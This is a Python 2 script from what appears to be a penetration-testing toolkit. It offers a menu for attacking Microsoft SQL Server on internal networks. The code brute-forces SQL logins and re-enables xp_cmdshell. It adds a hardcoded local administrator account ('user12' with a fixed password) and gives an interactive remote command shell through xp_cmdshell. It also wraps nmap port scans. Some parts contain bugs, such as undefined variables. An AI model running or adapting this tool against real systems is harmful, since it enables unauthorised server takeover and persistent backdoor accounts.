#!/usr/bin/env python
import os,time
try:
   import psyco
   psyco.full()
except ImportError:
   pass
while 1==1:
          intmenu=raw_input("""\nInternal Pentesting Menu:

   1. Microsoft SQL Bruter
   2. Port Scanning
   3. Go Back a previous menu

   Enter a number: """)

# Option 1 SQL Hackin
 
          if intmenu == '1':
            try:
              import _mssql              
              sqlportip=raw_input("""
  Enter the IP Address and Port Number to Attack.

  Options: (a)ttempt SQL Ping and Auto Quick Brute Force
           (m)ass scan and dictionary brute
           (s)ingle Target (Attack a Single Target with big dictionary)
           (f)ind SQL Ports (SQL Ping)
           (i) want a command prompt and know which system is vulnerable
           (v)ulnerable system, I want to add a local admin on the box...
           (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)
                       
  Enter Option: """)

#Start enable xp cmdshell

              if sqlportip == 'e' :
                 vulner1=raw_input("Enter the IP address of vulnerable server: ")
                 vulner2=raw_input("Enter the username of the vulnerable server: ")
                 vulner3=raw_input("Enter the password of the vulnerable server, hit enter for blank: ")
                 print ""
                 print 'Attempting to connect with the credentials....'
                 time.sleep(1)
                 try: 
                    vulner4= _mssql.connect('%s:1433' % (vuln1), '%s' % (vuln2), '%s' % (vuln3))
                    print 'Connected! Turning on XP_Cmdshell'
                    time.sleep(1)
                    vulner4.select_db('master')
                    query0='''sp_addextendedproc "xp_cmdshell", "C:\\Program Files\\Microsoft SQL Server\\MSSQL\Binn\\xplog70.dll"'''
                    query1='''sp_configure "show advanced options", 1 ;RECONFIGURE'''
                    query2='''sp_configure "xp_cmdshell", 1 ;RECONFIGURE--'''
                    try:
                       quer0=vulner4.query(query0)
                       print 'Enabling...'
                    except Exception:
                       print ""
                    try:
                       quer1=vulner4.query(query1)
                       print 'Enabling...'
                    except Exception:
                       print ""
                    try:
                        quer2=vulner4.query2(query2)
                        print 'Enabling...'
                    except Exception:
                        print ""
                    print "Alright...try the xp_cmdshell now..."
                    time.sleep(2)
                 except Exception:
                     print "Sorry can't enable xp_cmdshell, are you running under sysadmin rights?"

# end enable xp cmdshell

# start vulnerable servere

              if sqlportip == 'v' :
                 vulner1=raw_input("Enter the IP address of vulnerable server: ")
                 vulner2=raw_input("Enter the username of the vulnerable server: ")
                 vulner3=raw_input("Enter the password of the vulnerable server, hit enter for blank: ")
                 if vulner3=='':
                    vulner3== ''
                 print 'Attempting to connect with the credentials....'
                 try: 
                    vulner4= _mssql.connect('%s:1433' % (vuln1), '%s' % (vuln2), '%s' % (vuln3))
                    print 'Connected!.... Adding user accounts..lets hope its running under SA rights...'
                    vulner4.select_db('master')
                    query="xp_cmdshell 'net user user12 P@55w0rd! /ADD'"
                    query2="xp_cmdshell 'net localgroup administrators user12 /ADD'"
                    quer=vulner4.query(query)
                    if quer:
                         print "insert table: %d" % quer
                         print vulner4.fetch_array()
                         return2=vulner4.query(query2)
                    if return2:
                         print "insert table: %d" % return2
                         print vulner4.fetch_array()
                    print """
    Nice...added a local user "user12" with password "P@55w0rd!"
                    """
                 except Exception :
                    print 'Something went wrong...sorry, try again?'

#end vulnerable server

              if sqlportip == 'f' :
                scanfirst1=raw_input("Enter the IP Range to scan for SQL Ports: ")
                scan01=os.system("nmap -sT -v -P0 -T Insane -p1433 %s > SqlScan.txt" % (scanfirst1))
                print """
                """
                print """ Scanning... please be patient ....\n"""
                scanres=os.popen("grep Discovered* SqlScan.txt").read()
                print scanres

              if sqlportip == 's' :
                  import sys
                  definepath=os.getcwd()
                  sys.path.append("%s/bin/ftsrc/" % (definepath))
                  try: reload(sqlbruteword)
                  except Exception: pass
                  import sqlbruteword
                 
#Start SQL Command prompt

              if sqlportip == 'i' :
                   while 1 == 1:
                       try :
                           sqlportip=raw_input("Enter IP of SQL Server: ")
                           if sqlportip == 'quit' :
                              break
                           username=raw_input("Enter the Username, hit enter for sa: ")
                           if username == '' :
                              username == 'sa'
                           password=raw_input("Enter password for SQL server, hit enter for blank: ")
                           if password == '' :
                              password == ''
                           mssql = _mssql.connect('%s:1433' % (sqlportip),'%s' % (username),'%s' % (password))
                           mssql.select_db('master')
                           while 1 == 1 :
                              commandprompt=raw_input("Enter your command, type control-c to exit: ")
                              if commandprompt == 'quit' :
                                 break
                              query3="xp_cmdshell '%s'" % commandprompt
                              printquery=mssql.query(query3)
                              if printquery:
                                 print mssql.fetch_array()
                       except Exception:
                         print """Login failed...try again. """

# Start Mass Scan and Mass Brute

              if sqlportip == 'm' :
                  import sys
                  definepath=os.getcwd()
                  sys.path.append("%s/bin/ftsrc/" % (definepath))
                  try: reload(sqlbruteword)
                  except Exception: pass
                  import sqlbruteword

# End Mass Scan and Mass Brute


# Start Quick Brute

              if sqlportip == 'a' :
                  import sys
                  definepath=os.getcwd()
                  sys.path.append("%s/bin/ftsrc/" % (definepath))
                  try:
                      reload(sqlbrutequick)
                  except Exception: pass
                  import sqlbrutequick


#End Option SQL Range Brute Force

# Error handling

            except Exception,e :
	          print "\nSomething went wrong, printing error: ",e
                  time.sleep(2)

# End Option 1
# Option 2 Port Scanning

          if intmenu == '2':
             portmenu2=raw_input("""What type of scan:
             

    1. Stealth SYN
    2. TCP Connect

    Choose a number:  """)

            # Choose 1 Syn Scan
             if portmenu2 == '1':
                synip=raw_input("""

Example usage: 192.168.1.1-255

Enter the IP: """)
                print "Scanning be patient..."
                syn=os.system("nmap -sS -A -v -P0 %s > portscan.txt" % (synip))
                print "*** Results will be printed in under portscan.txt ***"
                syn3=os.system("kwrite portscan.txt &") 
            # Choose 2 TCP Scan
             if portmenu2 == '2':
                tcpip=raw_input("""

Example usage: 192.168.1.1-255

Enter the IP: """)
                print "Scanning be patient...."
                tcp=os.system("nmap -sT -A -v -P0 %s > portscan.txt" % (tcpip))
                print "*** Results will be printed under portscan.txt ***" 
                tcp3=os.system("kwrite portscan.txt &" % (tcpip))           
# End Port Scan


# Option 4 Previous Menu

          if intmenu == '3':
             
            print """\n\n     ****** Returning to previous menu ******\n\n"""
            break
